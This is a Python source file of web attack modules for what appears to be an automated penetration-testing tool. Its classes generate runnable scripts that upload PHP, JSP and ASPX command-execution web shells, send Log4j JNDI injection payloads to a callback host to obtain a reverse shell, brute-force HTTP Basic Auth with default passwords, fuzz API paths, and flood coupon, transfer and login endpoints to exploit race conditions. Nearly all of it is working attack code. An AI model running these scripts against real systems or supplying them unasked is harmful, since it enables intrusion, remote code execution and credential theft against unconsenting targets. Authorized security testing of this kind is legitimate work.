"""Attack modules: web."""

from __future__ import annotations

from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext


class WebShellUpload(AttackModule):
    name = "WebShellUpload"
    description = "Upload PHP/JSP/ASPX web shell via file upload vulnerabilities"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 8000, 3000]
    required_cves = []
    # Capability metadata: a confirmed upload is a webshell foothold.
    requires: list[str] = []
    produces: list[str] = ["webshell", "foothold"]
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Attempts to upload web shells with various extensions and bypasses. "
                "On WEBSHELL_CONFIRMED the orchestrator sets shell_type=webshell."
            ),
            # Phase 3: a successful upload is a real foothold path.
            "shell_type": "webshell",
            "privilege_level": "user",
            "evidence": [f"webshell upload attempts queued against {ctx.target_ip}"],
            "references": [
                "https://owasp.org/www-community/attacks/Unrestricted_File_Upload",
                "https://book.hacktricks.wiki/en/pentesting-web/file-upload.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        # Phase 2: `requests` is NOT a declared dependency (requirements.txt /
        # pyproject.toml) -- the old script died with ModuleNotFoundError on a
        # fresh install. Rewritten with stdlib urllib (multipart hand-rolled,
        # ~10 lines) so it runs anywhere with zero new deps.
        return f"""import sys, uuid, urllib.request, urllib.error
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
scheme = "https" if port in (443, 8443) else "http"
url = f"{{scheme}}://{{host}}:{{port}}"
shells = [
    ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
    ("shell.phtml", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
    ("shell.jsp", b"<% Runtime.getRuntime().exec(request.getParameter(\\"cmd\\")); %>", "application/jsp"),
    ("shell.aspx", b"<%@ Page Language=\\"C#\\" %><% System.Diagnostics.Process.Start(\\"cmd.exe\\", \\"/c \\" + Request[\\"cmd\\"]); %>", "application/aspx"),
]
boundary = "----breachpilot" + uuid.uuid4().hex
for filename, content, ctype in shells:
    try:
        body = (
            f"--{{boundary}}\\r\\n"
            f'Content-Disposition: form-data; name="file"; filename="{{filename}}"\\r\\n'
            f"Content-Type: {{ctype}}\\r\\n\\r\\n"
        ).encode() + content + f"\\r\\n--{{boundary}}--\\r\\n".encode()
        req = urllib.request.Request(
            f"{{url}}/upload", data=body, method="POST",
            headers={{"Content-Type": f"multipart/form-data; boundary={{boundary}}"}},
        )
        try:
            resp = urllib.request.urlopen(req, timeout=10)
            status = getattr(resp, "status", 200)
        except urllib.error.HTTPError as e:
            status = e.code
        if status in (200, 201, 302):
            print(f"UPLOAD SUCCESS: {{filename}} (status {{status}})")
            break
    except Exception as e:
        print(f"{{filename}} failed: {{e}}")
"""


class Log4jRCE(AttackModule):
    name = "Log4jRCE"
    description = "Log4j JNDI injection RCE (CVE-2021-44228)"
    target_services = ["http", "https"]
    target_ports = [8080, 8443, 80, 443]
    required_cves = ["CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45105", "CVE-2021-44832"]
    # Phase 3: version-gated -- Log4j 2.0-beta9 through 2.14.1 (2.15.0 still
    # vulnerable to CVE-2021-45046).
    target_versions = {
        "http": [
            "log4j 2.0",
            "log4j 2.1",
            "log4j 2.2",
            "log4j 2.3",
            "log4j 2.4",
            "log4j 2.5",
            "log4j 2.6",
            "log4j 2.7",
            "log4j 2.8",
            "log4j 2.9",
            "log4j 2.10",
            "log4j 2.11",
            "log4j 2.12",
            "log4j 2.13",
            "log4j 2.14",
            "log4j 2.15",
        ],
        "https": ["log4j 2.0", "log4j 2.14", "log4j 2.15"],
    }
    # Capability metadata: remote RCE primitive -- a confirmed JNDI callback is
    # a reverse shell + foothold. No prerequisites (works against any vulnerable
    # Log4j endpoint); callback host is an operator parameter, not an artifact.
    requires: list[str] = []
    produces: list[str] = ["shell", "foothold"]
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Inject ${jndi:ldap://<callback>:1389/a} into any HTTP header or "
                "parameter. Callback host must be in exploit.allowed_targets. "
                "On callback confirmation the orchestrator sets shell_type=reverse."
            ),
            # Phase 3: this recipe represents a real compromise path -- declare
            # the intent signals so record_success can act on a confirmed
            # callback (the dispatch classifier fills evidence).
            "shell_type": "reverse",
            "privilege_level": "user",
            "evidence": [f"Log4j JNDI payloads queued against {ctx.target_ip}"],
            "references": [
                "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
                "https://www.lunasec.io/docs/blog/log4j-zero-day/",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import socket, sys
# Lightweight Log4j JNDI payload sender
# Target: {ctx.target_ip}
# Usage: python log4j_poc.py <target_host> <target_port>
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
# Phase 3: inject into MULTIPLE headers (User-Agent, Referer, X-Forwarded-For,
# X-Api-Version, Authorization, Host) + query params -- the old script only
# covered X-Api-Version. Callback host is a placeholder the operator replaces
# with their allowlisted listener.
CALLBACK_HOST = "<CALLBACK_HOST>"
CALLBACK_PORT = "1389"
payload = b"GET /?q=${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}} HTTP/1.1\\r\\n"
payload += b"Host: " + host.encode() + b"\\r\\n"
payload += b"User-Agent: ${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}}\\r\\n"
payload += b"Referer: ${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}}\\r\\n"
payload += b"X-Forwarded-For: ${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}}\\r\\n"
payload += b"X-Api-Version: ${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}}\\r\\n"
payload += b"Authorization: Bearer ${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}}\\r\\n\\r\\n"
s = socket.socket()
s.connect((host, port))
s.send(payload)
print(s.recv(4096).decode(errors="replace"))
s.close()
"""


class BasicAuthBuster(AttackModule):
    name = "BasicAuthBuster"
    description = "Brute-force HTTP Basic Auth with small default wordlist"
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443]
    required_cves = []
    # Capability metadata: a successful basic-auth brute yields credentials.
    requires: list[str] = []
    produces: list[str] = ["credentials"]
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Tests basic creds against HTTP basic auth. May trip rate limits.",
            "credentials_found": ["<VALID_CREDS: printed by script on SUCCESS>"],
            "evidence": [f"basic-auth credential test queued against {ctx.target_ip}"],
            "references": [
                "https://owasp.org/www-community/attacks/Brute_force_attack",
                "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import urllib.request, base64, sys
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
creds = [("admin","admin"),("root","root"),("user","user"),("admin","password"),("guest","guest")]
for u,p in creds:
    req = urllib.request.Request(f"http://{{host}}:{{port}}/")
    creds_b64 = base64.b64encode(f"{{u}}:{{p}}".encode()).decode()
    req.add_header("Authorization", f"Basic {{creds_b64}}")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            if resp.status < 400:
                print(f"SUCCESS: {{u}}/{{p}}")
                break
    except Exception:
        pass
"""


class APIFuzzer(AttackModule):
    name = "APIFuzzer"
    description = "Fuzz common REST API endpoints for information disclosure or injection"
    target_services = ["http", "https", "api"]
    target_ports = [80, 443, 8080, 3000, 5000, 8000, 8443]
    required_cves = []
    # Capability metadata: endpoint fuzzing surfaces routes, not artifacts.
    requires: list[str] = []
    produces: list[str] = []
    read_only = False
    cost = "low"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Fuzzes /api, /v1, /graphql, etc. for 200/403 differences.",
            "evidence": [f"API fuzzing queued against {ctx.target_ip}"],
            "references": [
                "https://owasp.org/www-community/attacks/API_Parameter_Tampering",
                "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/api-endpoint.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import urllib.request, json, sys
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
paths = ["/api","/api/v1","/v1","/graphql","/rest","/swagger.json","/openapi.json","/api/users","/api/admin"]
for p in paths:
    try:
        req = urllib.request.Request(f"http://{{host}}:{{port}}{{p}}")
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read(2048).decode(errors="replace")
            print(f"{{p}} -> {{resp.status}} ({{len(body)}} bytes)")
    except urllib.error.HTTPError as e:
        print(f"{{p}} -> {{e.code}}")
    except Exception:
        pass
"""


class RaceRequest(AttackModule):
    name = "RaceRequest"
    description = (
        "Send N concurrent requests to exploit TOCTOU race conditions (coupon reuse, limit bypass, double-spend)"
    )
    target_services = ["http", "https"]
    target_ports = [80, 443, 8080, 8443, 3000, 5000]
    required_cves = []
    # Capability metadata: race-condition exploitation; a successful bypass
    # surfaces a finding, not a durable artifact.
    requires: list[str] = []
    produces: list[str] = []
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Sends concurrent requests to exploit race conditions in rate limits, coupon codes, and transactions.",
            "evidence": [f"race-condition probes queued against {ctx.target_ip}"],
            "references": [
                "https://portswigger.net/web-security/race-conditions",
                "https://book.hacktricks.wiki/en/pentesting-web/race-condition.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""Race Condition Exploit — concurrent request sender for TOCTOU attacks."""
import concurrent.futures, json, sys, threading, time, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"
CONCURRENT = int(sys.argv[3]) if len(sys.argv) > 3 else 20

results = {{"success": 0, "failure": 0, "responses": []}}
lock = threading.Lock()

def send_request(url: str, method: str = "POST", data: bytes = b"", headers: dict = None) -> dict:
    """Send a single request and return status."""
    hdrs = headers or {{}}
    try:
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read(2048).decode(errors="replace")
            with lock:
                results["success"] += 1
                results["responses"].append({{"status": resp.status, "body": body[:200]}})
            return {{"status": resp.status, "success": True}}
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        with lock:
            results["failure"] += 1
            results["responses"].append({{"status": e.code, "body": body[:200]}})
        return {{"status": e.code, "success": False}}
    except Exception as e:
        with lock:
            results["failure"] += 1
        return {{"error": str(e)}}

# Test endpoints commonly vulnerable to race conditions
test_cases = [
    {{
        "name": "Coupon/Code Redemption",
        "url": f"{{BASE}}/api/redeem",
        "method": "POST",
        "data": json.dumps({{"code": "TEST100", "user": "attacker"}}).encode(),
        "headers": {{"Content-Type": "application/json"}},
    }},
    {{
        "name": "Vote/Like Endpoint",
        "url": f"{{BASE}}/api/vote",
        "method": "POST",
        "data": json.dumps({{"item_id": "1", "vote": "up"}}).encode(),
        "headers": {{"Content-Type": "application/json"}},
    }},
    {{
        "name": "Transfer/Transaction",
        "url": f"{{BASE}}/api/transfer",
        "method": "POST",
        "data": json.dumps({{"to": "attacker", "amount": 100}}).encode(),
        "headers": {{"Content-Type": "application/json"}},
    }},
    {{
        "name": "Rate Limit Bypass",
        "url": f"{{BASE}}/api/login",
        "method": "POST",
        "data": json.dumps({{"username": "admin", "password": "test"}}).encode(),
        "headers": {{"Content-Type": "application/json"}},
    }},
]

print(f"=== Race Condition Attack: {{BASE}} ===\\n")

for tc in test_cases:
    print(f"\\n[Test] {{tc['name']}}: {{tc['url']}}")
    print(f"  Sending {{CONCURRENT}} concurrent requests...")

    results = {{"success": 0, "failure": 0, "responses": []}}
    start = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENT) as executor:
        futures = [
            executor.submit(
                send_request,
                tc["url"],
                tc.get("method", "POST"),
                tc.get("data", b""),
                tc.get("headers"),
            )
            for _ in range(CONCURRENT)
        ]
        concurrent.futures.wait(futures)

    elapsed = time.time() - start
    print(f"  Completed in {{elapsed:.2f}}s")
    print(f"  Success: {{results['success']}}, Failure: {{results['failure']}}")

    # Analyze for race condition indicators
    statuses = [r.get("status") for r in results["responses"]]
    unique_statuses = set(statuses)
    if len(unique_statuses) > 1:
        print(f"  [!] Mixed status codes: {{unique_statuses}} — possible race condition!")
    if results["success"] > 1:
        print(f"  [!] {{results['success']}} requests succeeded — limit may be bypassed!")

    # Show sample responses
    for i, r in enumerate(results["responses"][:3]):
        print(f"  Response {{i+1}}: status={{r.get('status')}} body={{r.get('body', '')[:100]}}")

print("\\n[!] For advanced race testing, use Turbo Intruder (Burp) or custom async scripts.")
'''
